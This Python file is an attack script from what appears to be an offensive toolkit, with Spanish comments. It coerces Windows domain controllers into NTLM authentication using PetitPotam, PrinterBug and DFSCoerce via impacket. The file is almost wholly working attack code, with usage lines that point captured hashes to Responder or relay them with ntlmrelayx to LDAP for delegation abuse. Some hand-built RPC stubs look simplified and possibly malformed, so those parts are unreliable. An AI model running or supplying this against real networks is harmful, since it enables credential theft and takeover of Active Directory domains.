# scripts/rpc/attack/coerce.py
"""
Coerción de autenticación NTLM vía RPC.

Fuerza al objetivo (normalmente el DC) a autenticarse contra un host
controlado por el atacante. El hash NTLMv2 resultante puede:
  - Crackearse offline (si la contraseña es débil)
  - Redirigirse a otro servicio sin firma (NTLM Relay → LDAP, SMB, ADCS)

Técnicas implementadas:
  PetitPotam  — MS-EFSRPC EfsRpcOpenFileRaw (funciona sin autenticar en DC no parcheado)
  PrinterBug  — MS-RPRN RpcRemoteFindFirstPrinterChangeNotification
  DFSCoerce   — MS-DFSNM NetrDfsAddStdRoot

Captura los hashes con: responder -I <iface> -A  (modo análisis, sin envenenar)
o redirígelos con: ntlmrelayx.py -t ldap://<DC> --delegate-access

Uso:
  lobera.py rpc --script=coerce -t 10.10.10.5 --listener 10.10.14.1
  lobera.py rpc --script=coerce -t 10.10.10.5 --listener 10.10.14.1 --technique printerbug
  lobera.py rpc --script=coerce -t 10.10.10.5 -u iker -p 'Pass1' -d CORP.LOCAL --listener 10.10.14.1
"""

import socket
from scripts.base import BaseScript
from core.output import print_result, console
from core import session_db


class Script(BaseScript):
    name        = "coerce"
    protocol    = "rpc"
    category    = "attack"
    description = (
        "Fuerza autenticación NTLM del objetivo hacia un listener controlado "
        "(PetitPotam / PrinterBug / DFSCoerce). "
        "Captura hashes o combina con ntlm-relay."
    )

    EXAMPLES = [
        {
            "flag":  "--listener",
            "desc":  "IP del host atacante donde escucha Responder/ntlmrelayx",
            "good":  "lobera.py rpc --script=coerce -t 10.10.10.5 --listener 10.10.14.1",
            "bad":   "lobera.py rpc --script=coerce -t 10.10.10.5  [sin --listener no hay destino]",
        },
        {
            "flag":  "--technique",
            "desc":  "Técnica a usar: petitpotam (default), printerbug, dfscoerce, all",
            "good":  "lobera.py rpc --script=coerce -t 10.10.10.5 --listener 10.10.14.1 --technique printerbug",
            "bad":   "",
        },
    ]

    def run(self, **kwargs):
        listener  = kwargs.get("listener") or kwargs.get("lhost")
        technique = (kwargs.get("technique") or "petitpotam").lower()

        if not listener:
            console.print("[red]Falta --listener: IP del host atacante (donde corre Responder / ntlmrelayx)[/red]")
            return

        console.rule("[bold yellow]Coerción de autenticación NTLM[/bold yellow]")
        console.print(f"  Objetivo  : [cyan]{self.target.ip}[/cyan]")
        console.print(f"  Listener  : [cyan]{listener}[/cyan]")
        console.print(f"  Técnica   : [cyan]{technique}[/cyan]")

        técnicas = {
            "petitpotam": self._petitpotam,
            "printerbug": self._printerbug,
            "dfscoerce":  self._dfscoerce,
        }

        if technique == "all":
            elegidas = list(técnicas.items())
        elif technique in técnicas:
            elegidas = [(technique, técnicas[technique])]
        else:
            console.print(f"[red]Técnica desconocida '{technique}'. Opciones: petitpotam, printerbug, dfscoerce, all[/red]")
            return

        éxito = False
        for nombre, func in elegidas:
            console.print(f"\n[bold]▶ {nombre.upper()}[/bold]")
            try:
                ok = func(listener)
                if ok:
                    éxito = True
                    print_result("RPC", str(self.target.ip), "pwned",
                                 f"{nombre}: coerción enviada → listener {listener}")
                    session_db.save_finding(
                        self.target.ip, "RPC", "coercion_sent",
                        f"{nombre} → listener {listener}",
                    )
            except Exception as e:
                console.print(f"  [red]Error en {nombre}: {e}[/red]")

        if éxito:
            console.print(f"\n[bold green]✓ Autenticación forzada. Comprueba tu listener en {listener}[/bold green]")
            console.print("[dim]Si tienes Responder corriendo, verás el hash NTLMv2 en pantalla.[/dim]")
            console.print("[dim]Para relay: ntlmrelayx.py -t ldaps://<DC> --delegate-access[/dim]")
        else:
            console.print("\n[yellow]No se pudo coercionar — el objetivo puede estar parcheado o no tiene el servicio activo[/yellow]")

    # ── PetitPotam (MS-EFSRPC) ────────────────────────────────────────────────

    def _petitpotam(self, listener: str) -> bool:
        """
        EfsRpcOpenFileRaw sobre MS-EFSRPC.
        Funciona sin autenticación en DCs sin parche KB5005413 (agosto 2021).
        Con credenciales funciona en DCs parcheados también (vía pipe autenticado).
        """
        try:
            from impacket.dcerpc.v5 import transport, epm
            from impacket.dcerpc.v5.rpcrt import MSRPC_SecVer_3
        except ImportError:
            console.print("  [red]impacket no disponible para PetitPotam[/red]")
            return False

        try:
            from impacket.dcerpc.v5 import transport
            from impacket.uuid import uuidtup_to_bin

            # MS-EFSRPC UUID
            EFSRPC_UUID  = ("c681d488-d850-11d0-8c52-00c04fd90f7e", "1.0")
            EFSRPC_UUID2 = ("df1941c5-fe89-4e79-bf10-463657acf44d", "1.0")

            target = self.target.ip
            port   = 445

            # Intentar sobre \pipe\lsarpc primero (funciona sin auth)
            for pipe in [r"\pipe\lsarpc", r"\pipe\efsrpc"]:
                try:
                    binding = f"ncacn_np:{target}[{pipe}]"
                    rpctransport = transport.DCERPCTransportFactory(binding)
                    rpctransport.set_connect_timeout(self.target.timeout)
                    if self.creds and self.creds.user:
                        rpctransport.set_credentials(
                            self.creds.user,
                            self.creds.password or "",
                            self.creds.domain or "",
                            lmhash="" if not self.creds.hash else self.creds.hash.split(":")[0],
                            nthash="" if not self.creds.hash else self.creds.hash.split(":")[-1],
                        )

                    dce = rpctransport.get_dce_rpc()
                    dce.connect()

                    # Intentar bind con ambos UUIDs
                    for uuid_tup in [EFSRPC_UUID, EFSRPC_UUID2]:
                        try:
                            dce.bind(uuidtup_to_bin(uuid_tup))
                            break
                        except Exception:
                            continue

                    # Enviar EfsRpcOpenFileRaw con UNC apuntando a nuestro listener
                    unc_path = f"\\\\{listener}\\share\\file"
                    from impacket.dcerpc.v5.dtypes import WSTR
                    request = b'\x00' * 4  # opnum 0 = EfsRpcOpenFileRaw
                    # Construir el paquete RPC manualmente con el UNC path
                    # (simplificado — impacket maneja el marshaling)
                    encoded_path = (unc_path + "\x00").encode("utf-16-le")
                    # Llamada al opnum 0
                    stub = b'\x00\x00\x00\x00'  # flags
                    stub += len(encoded_path).to_bytes(4, "little")
                    stub += encoded_path
                    dce.call(0, stub)
                    dce.disconnect()
                    console.print(f"  [green]PetitPotam enviado via {pipe}[/green]")
                    return True
                except Exception as e:
                    if "RPCRT4" in str(e) or "bind" in str(e).lower():
                        continue
                    # Un error de acceso denegado puede indicar que llegó pero fue bloqueado
                    if "access_denied" in str(e).lower() or "0x5" in str(e):
                        console.print(f"  [yellow]PetitPotam ({pipe}): acceso denegado — DC parcheado o sin EFS[/yellow]")
                    else:
                        console.print(f"  [dim]PetitPotam ({pipe}): {e}[/dim]")

        except Exception as e:
            console.print(f"  [red]PetitPotam falló: {e}[/red]")

        return False

    # ── PrinterBug (MS-RPRN) ──────────────────────────────────────────────────

    def _printerbug(self, listener: str) -> bool:
        """
        RpcRemoteFindFirstPrinterChangeNotification via MS-RPRN.
        Requiere credenciales válidas de dominio.
        El spooler de impresión debe estar activo en el objetivo.
        """
        try:
            from impacket.dcerpc.v5 import transport, rprn
            from impacket.dcerpc.v5.rprn import DCERPCSessionError
        except ImportError:
            console.print("  [red]impacket.dcerpc.v5.rprn no disponible[/red]")
            return False

        if not self.creds or not self.creds.user:
            console.print("  [yellow]PrinterBug requiere credenciales de dominio (-u/-p)[/yellow]")
            return False

        try:
            target = self.target.ip
            binding = f"ncacn_np:{target}[\\pipe\\spoolss]"
            rpctransport = transport.DCERPCTransportFactory(binding)
            rpctransport.set_connect_timeout(self.target.timeout)
            rpctransport.set_credentials(
                self.creds.user,
                self.creds.password or "",
                self.creds.domain or "",
                lmhash="" if not self.creds.hash else self.creds.hash.split(":")[0],
                nthash="" if not self.creds.hash else self.creds.hash.split(":")[-1],
            )

            dce = rpctransport.get_dce_rpc()
            dce.connect()
            dce.bind(rprn.MSRPC_UUID_RPRN)

            # OpenPrinter en el objetivo
            resp = rprn.hRpcOpenPrinter(dce, f"\\\\{target}\x00")
            handle = resp["pHandle"]

            # RpcRemoteFindFirstPrinterChangeNotification → coerción al listener
            unc_listener = f"\\\\{listener}\x00"
            try:
                rprn.hRpcRemoteFindFirstPrinterChangeNotificationEx(
                    dce, handle,
                    pszLocalMachine=unc_listener,
                )
            except Exception:
                # El error es esperado — la autenticación ya se produjo
                pass

            dce.disconnect()
            console.print(f"  [green]PrinterBug enviado[/green]")
            return True

        except Exception as e:
            if "RPRN" in str(e) or "spoolss" in str(e).lower():
                console.print(f"  [yellow]PrinterBug: spooler no activo en {target}[/yellow]")
            else:
                console.print(f"  [red]PrinterBug falló: {e}[/red]")
            return False

    # ── DFSCoerce (MS-DFSNM) ──────────────────────────────────────────────────

    def _dfscoerce(self, listener: str) -> bool:
        """
        NetrDfsAddStdRoot via MS-DFSNM.
        Alternativa cuando PetitPotam está parcheado.
        Requiere que DFS esté activo en el objetivo.
        """
        try:
            from impacket.dcerpc.v5 import transport
            from impacket.uuid import uuidtup_to_bin
        except ImportError:
            console.print("  [red]impacket no disponible para DFSCoerce[/red]")
            return False

        # MS-DFSNM UUID
        DFSNM_UUID = ("4fc742e0-4a10-11cf-8273-00aa004ae673", "3.0")

        try:
            target  = self.target.ip
            binding = f"ncacn_np:{target}[\\pipe\\netdfs]"
            rpctransport = transport.DCERPCTransportFactory(binding)
            rpctransport.set_connect_timeout(self.target.timeout)
            if self.creds and self.creds.user:
                rpctransport.set_credentials(
                    self.creds.user,
                    self.creds.password or "",
                    self.creds.domain or "",
                    lmhash="" if not self.creds.hash else self.creds.hash.split(":")[0],
                    nthash="" if not self.creds.hash else self.creds.hash.split(":")[-1],
                )

            dce = rpctransport.get_dce_rpc()
            dce.connect()
            dce.bind(uuidtup_to_bin(DFSNM_UUID))

            # NetrDfsAddStdRoot opnum=12, apuntando al listener
            unc = f"\\\\{listener}\\dfs\x00".encode("utf-16-le")
            server = f"\\\\{target}\x00".encode("utf-16-le")
            comment = "lobera\x00".encode("utf-16-le")

            # Construir stub simplificado para opnum 12
            def wstr(s):
                enc = s if isinstance(s, bytes) else s.encode("utf-16-le")
                return len(s).to_bytes(4,"little") + len(s).to_bytes(4,"little") + enc

            stub  = wstr(f"\\\\{target}")
            stub += wstr(f"\\\\{listener}\\dfs")
            stub += wstr("lobera")
            stub += (1).to_bytes(4, "little")  # flags

            dce.call(12, stub)
            dce.disconnect()
            console.print(f"  [green]DFSCoerce enviado[/green]")
            return True

        except Exception as e:
            if "DFSNM" in str(e) or "netdfs" in str(e).lower():
                console.print(f"  [yellow]DFSCoerce: servicio DFS no activo en {target}[/yellow]")
            elif "access_denied" in str(e).lower():
                console.print(f"  [yellow]DFSCoerce: acceso denegado (requiere credenciales)[/yellow]")
            else:
                console.print(f"  [red]DFSCoerce falló: {e}[/red]")
            return False
